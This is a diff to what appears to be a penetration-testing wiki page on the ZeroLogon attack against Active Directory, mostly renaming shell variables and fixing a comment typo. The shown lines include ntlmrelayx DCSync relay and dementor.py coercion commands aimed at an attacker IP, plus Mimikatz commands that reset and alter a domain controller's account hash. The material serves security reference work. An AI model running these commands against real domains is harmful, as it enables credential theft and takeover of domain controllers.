@@ -31,13 +31,13 @@ Another technique, [showcased by Dirk-jan](https://dirkjanm.io/a-different-way-o
 In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp/impacket)'s script [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) can be used.
 
 ```bash
-ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
+ntlmrelayx -t dcsync://$DC_HOST_2 -smb2support
 ```
 
 Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).
 
 ```bash
-dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
+dementor.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST_1"
 ```
 
 ### Password change ( :warning: disruptive)
@@ -92,10 +92,10 @@ lsadump::dcsync /domain:'Domain' /dc:'Domain_controller' /user:'Administrator' /
 # Reset the DC account's password in AD and in its SAM base
 lsadump::postzerologon /target:'Domain_Controller' /account:'DC_account$'
 
-# (alternative to postezerologon) Find the previous NT hash
+# (alternative to postzerologon) Find the previous NT hash
 //TODO
 
-# (alternative to postezerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
+# (alternative to postzerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
 lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:'previous_NThash'
 ```
 
